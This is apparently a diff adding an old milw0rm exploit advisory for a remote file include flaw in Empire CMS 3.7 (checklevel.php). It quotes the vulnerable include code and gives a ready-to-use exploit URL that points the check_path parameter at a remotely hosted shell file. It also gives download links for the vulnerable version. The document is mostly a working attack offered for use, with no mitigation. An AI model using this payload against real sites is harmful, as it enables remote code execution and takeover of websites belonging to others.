@@ -1,0 +1,26 @@
+    Empire CMS <=3.7 (checklevel.php) Remote File Include Vulnerability
+           Find by: Bob Linuson
+
+# Code:
+
+2   $includefile=$check_path."e/class/MemberLevel.php";
+3   include("$includefile");
+.....
+67  include($check_path."e/class/connect.php");
+68  include($check_path."e/class/db_sql.php");
+69  include($check_path."e/class/user.php");
+
+
+#Exploit:
+
+http://www.site.com/e/class/checklevel.php?check_path=http://shell.txt?
+
+
+#URL:
+
+http://www.phome.net/tmp/ecms37/
+http://www.phome.net/tmp/ecms37/down.php?url=/tmp/ecms37/ecms3.7-free.rar&
+english:
+http://translate.google.com/translate?u=http%3A%2F%2Fwww.phome.net%2Ftmp%2Fecms37%2F&langpair=zh-CN%7Cen&hl=zh-CN&newwindow=1&ie=UTF-8&oe=UTF-8&prev=%2Flanguage_tools
+
+# milw0rm.com [2006-08-22]
